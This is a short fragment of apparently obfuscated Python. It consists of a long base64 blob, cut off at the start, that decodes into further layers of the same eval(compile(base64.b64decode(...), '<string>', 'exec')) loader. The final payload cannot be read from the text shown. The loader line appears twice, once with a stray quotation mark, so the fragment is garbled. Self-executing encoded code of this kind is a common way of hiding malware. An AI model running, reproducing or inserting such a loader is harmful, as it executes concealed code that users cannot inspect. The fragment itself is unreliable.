lbFJxVG1sTk1IQnlVVEprZGxvd2JFUlJWMlJLVVRCR2JsTlZhRXRpUjFKSlZtNXNhV0ZWU2pOYVZtaFBZbGRTU1ZGWVZsSk5hbXd4V1cweFYyRnRVa2hpU0ZwcFlWZGtlRk15TlVOaFIwNTBVbTVTYW1WWGRFeEpaM0JzWkcxR2MwdEhUblppV0VKd1lrZFZiMWx0Um5wYVZGa3dURzFKTWs1SFVteFpNamxyV2xOb2RsUXdPSGRpTWpsMlZEQTRjRXhEUVdsUVNFNHdZMjFzZFZwNk5HbE1RMEZ1V2xob2JGbDVZM0JMVVQwOUlncGxkbUZzS0dOdmJYQnBiR1VvWW1GelpUWTBMbUkyTkdSbFkyOWtaU2h2VDA4d2IyOXZUMDhwTENBaVBITjBjbWx1Wno0aUxDQW5aWGhsWXljcEtRPT0iCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))